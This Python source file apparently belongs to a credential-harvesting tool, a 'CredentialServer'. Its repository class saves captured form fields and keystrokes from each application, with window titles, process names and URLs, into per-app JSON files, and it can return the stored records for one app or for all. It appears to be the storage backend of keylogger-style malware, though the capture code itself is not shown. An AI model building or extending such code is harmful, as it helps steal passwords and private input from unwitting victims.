import os
import json
import datetime
import logging
from typing import Dict, List
from interfaces.credential_repository import ICredentialRepository
from interfaces.document_namer import IDocumentNamer

logger = logging.getLogger("CredentialServer")

class FileSystemCredentialRepository(ICredentialRepository):
    """File system implementation of ICredentialRepository"""
    
    def __init__(self, base_directory: str, document_namer: IDocumentNamer):
        """Initialize with base directory for storing files"""
        self.base_directory = base_directory
        self.document_namer = document_namer
        
        # Create base directory if it doesn't exist
        if not os.path.exists(base_directory):
            os.makedirs(base_directory)
        
        logger.info(f"FileSystem repository initialized with base directory '{base_directory}'")
    
    def save_credentials(self, application_info: Dict, form_fields: List[Dict], keystrokes: List[Dict]) -> str:
        """Save credentials as JSON file"""
        app_name = application_info.get("ApplicationName", "Unknown")
        window_title = application_info.get("WindowTitle", "Unknown")
        document_name = self.document_namer.generate_document_name(app_name, window_title)
        
        # Create app-specific directory
        app_directory = os.path.join(self.base_directory, app_name.replace(" ", "_"))
        if not os.path.exists(app_directory):
            os.makedirs(app_directory)
        
        # Create the document
        document = {
            "app_name": app_name,
            "window_title": window_title,
            "process_name": application_info.get("ProcessName", "Unknown"),
            "url": application_info.get("URL", "Unknown"),
            "timestamp": datetime.datetime.now().isoformat(),
            "form_fields": form_fields,
            "keystrokes": keystrokes
        }
        
        # Save to file
        file_path = os.path.join(app_directory, f"{document_name}.json")
        with open(file_path, 'w') as f:
            json.dump(document, f, indent=2)
        
        logger.info(f"Saved credentials for {app_name} to file {file_path}")
        return file_path
    
    def get_credentials_by_app(self, app_name: str) -> List[Dict]:
        """Retrieve credentials by application name"""
        app_directory = os.path.join(self.base_directory, app_name.replace(" ", "_"))
        if not os.path.exists(app_directory):
            return []
        
        result = []
        for filename in os.listdir(app_directory):
            if filename.endswith(".json"):
                file_path = os.path.join(app_directory, filename)
                try:
                    with open(file_path, 'r') as f:
                        credential = json.load(f)
                        result.append(credential)
                except Exception as e:
                    logger.error(f"Error reading credential file {file_path}: {e}")
        
        return result
    
    def get_all_credentials(self) -> List[Dict]:
        """Retrieve all stored credentials"""
        result = []
        
        for app_dir in os.listdir(self.base_directory):
            app_path = os.path.join(self.base_directory, app_dir)
            if os.path.isdir(app_path):
                for filename in os.listdir(app_path):
                    if filename.endswith(".json"):
                        file_path = os.path.join(app_path, filename)
                        try:
                            with open(file_path, 'r') as f:
                                credential = json.load(f)
                                result.append(credential)
                        except Exception as e:
                            logger.error(f"Error reading credential file {file_path}: {e}")
        
        return result